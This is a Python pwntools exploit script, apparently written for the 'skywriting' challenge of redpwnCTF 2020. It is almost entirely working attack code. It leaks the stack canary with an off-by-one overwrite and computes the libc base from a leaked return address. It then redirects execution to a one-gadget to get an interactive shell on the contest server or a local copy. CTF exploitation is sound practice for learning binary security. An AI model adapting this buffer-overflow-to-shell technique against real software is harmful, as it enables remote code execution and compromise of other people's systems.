#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./skywriting"
LIBCNAME = "./libc.so.6"

hosts = ("2020.redpwnc.tf","localhost","localhost")
ports = (31034,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

## exploit ###########################################

def exploit():
  global c
  fakeflag = "notflag{a_cloud_is_just_someone_elses_computer}\n"
  ogs = [0x4f2c5,0x4f322,0x10a38c]

  # canary leak
  c.recvline()
  c.sendline(str(1))
  c.recvuntil("shot: ")
  size = 0x88
  c.send("A"*(size+1))
  c.recvuntil("A"*(size))
  #canary = unpack(c.recvuntil("?")[:-1].ljust(8,'\x00')) // 0x100 * 0x100
  canary = unpack(c.recv(8).ljust(8,'\x00')) // 0x100 * 0x100
  print("[+] canary: "+hex(canary))
  
  # canaryごと埋めてlibcbase leaek
  c.recvuntil("shot: ")
  c.send("A"*(size + 0x8) + "B"*8 )
  c.recvuntil("B"*0x8)
  libcbase = unpack(c.recvuntil("?")[:-1].ljust(8,'\x00')) - libc.symbols["__libc_start_main"] - 243 + 12
  print("[+] libcbase: "+hex(libcbase))

  # canaryを直しつつRAをonegadgetへ
  c.recvuntil("shot: ")
  c.send("A"*size + p64(canary) + p64(0) + p64(libcbase + ogs[0]))

  # whileを抜けてjmp
  c.recvuntil("shot: ")
  c.send(fakeflag+"\x00")


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
